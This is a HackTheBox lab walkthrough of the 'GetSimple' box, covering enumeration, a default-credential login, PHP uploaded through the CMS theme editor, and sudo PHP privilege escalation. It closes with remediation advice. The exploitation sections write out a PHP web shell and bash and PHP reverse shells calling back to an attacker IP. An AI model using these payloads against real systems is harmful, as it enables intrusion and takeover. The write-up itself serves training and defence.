---
layout: default
title: "Technical Report: GetSimple"
---

# WALKTHROUGH: GetSimple

* **Platform:** [HackTheBox]
* **Dificulty:** [Easy]
* **OS:** [Linux]
* **Date:** [2026-10-27]
* **Flags:** `user.txt` / `root.txt`
![Icon]({{ '/assets/images/getsimple/icon.png' | relative_url }})


---

## 1. Enumeration

Normal enumeration scans with NMAP.

```bash
sudo nmap -A -T4 -oA escaneo_GettingStartedFinal 10.129.203.62
sudo nmap -sC -sV -p- -T4 -oA escaneo_GettingStartedFinal_allports 10.129.203.62`
```

It only found 2 ports open:

![Nmap Open Ports]({{ '/assets/images/getsimple/01-nmap.png' | relative_url }})

Also followed by a whatweb scan to the directories found by NMAP:

```bash
whatweb http://10.129.203.62/admin/
whatweb http://10.129.203.62

```
![Whatweb scan]({{ '/assets/images/getsimple/01-whaweb.png' | relative_url }})
Then a directory scan is performed

```bash
gobuster dir -u http://10.129.203.62/ -w ../../../tools/SecLists/Discovery/Web-Content/common.txt
```
![Gobuster scan]({{ '/assets/images/getsimple/01-gobuster.png' | relative_url }})

Found some interesting folders and archives like admin

![Admin Portal]({{ '/assets/images/getsimple/01-adminportal.png' | relative_url }})

Once here we could try to guess some basic passwords like admin:admin


![Inside the page]({{ '/assets/images/getsimple/01-inside.png' | relative_url }})
Which in this case worked for me but theres also another way to get the password:

“You could get the password by doing a directory scan and ghoping to ../data/users/admin.xml.

![Contents admin.xml]({{ '/assets/images/getsimple/01-admincont.png' | relative_url }})
In said directory there’s a hash in SHA1, that can be cracked with an online craker:

![craked pass]({{ '/assets/images/getsimple/crackedpass.png' | relative_url }})

## 2. Exploitation

Once inside http://10.129.203.62/admin/

While poking around you can go to the Theme panel, and also edit it.

![Theme Panel]({{ '/assets/images/getsimple/theme-pan.png' | relative_url }})
In said space you can upload php code, most of the times this kind of features lets you execute code if not sanitized properly, then doing so, upload arbitrary code:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.109/4433 0>&1'");?>

##This one was used to test whether this option was viable
<?php system($_GET['cmd']); ?>
```
![WebShell Test]({{ '/assets/images/getsimple/webshell.png' | relative_url }})

Listen back with:

```bash
nc -lvnp 4433

```

Update Shell to Interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

#CTRL + Z
stty raw -echo; fg
```

![Inside Box]({{ '/assets/images/getsimple/inbox.png' | relative_url }})

Get the user flag at 

/home/mrb3n/user.txt


## 3. Privilege Escalation

Enumeration Again

Chechk whether we can execute something as root


```bash
sudo -l
```
![Check high privilages executions]({{ '/assets/images/getsimple/exec.png' | relative_url }})

As it is visible, the user can execute php as root without password.

What comes next is to execute a revershell using php as root to get a revershell back to the attacking host.

```bash
sudo php -r '$sock=fsockopen("10.10.15.109",4141);exec("/bin/sh -i <&3 >&3 2>&3");'
```
![Execution ReverseShell]({{ '/assets/images/getsimple/rever.png' | relative_url }})

Really important care with those quotes php is very sensible to them.

Initiate a listener on the attacker side.

```bash
nc -lvnp 4141
```

Then a root shell back to the attacking host.

![Root Privilages]({{ '/assets/images/getsimple/root-pwn.png' | relative_url }})

## 4. Remediation


1. Upgrade the CMS

Update GetSimple CMS from 3.3.15 to a newer release this latter is preferent that is supported to this day.

2. Improve Web Server Security Configurations

Block Access to Sensitive Data: Restrict external HTTP access to internal directories (such as /data/ and /admin/) using server block rules and lower the privilages until only ones needed in each directory.
Disable file execution privilages in upload directories, unless needed, in case that is needed implement methods for sanitazing input.

3. Restrict Administrative Access

Whitelisting: Restrict access to the /admin/ directory strictly to trusted IP addresses via FilesMatch or .htaccess rules even firewalls.

4. Weak Passwords

Update the default credentials to access the admin panels to longer and complex password, following the best practises (at least 8 charaters, nombres, upper and lower case letters, symbols and not consecutive patterns).

5. Lax privilages for executables

Avoid giving high privilages to executables, and even more importantly not for programming languages, which significantly lowers the difficulty of privilages escalation, if it is not needed delete this path form the sudores file, in case that it is necessary give them the script and wive it privilages, also disable ristky php functions like exec(), or system().
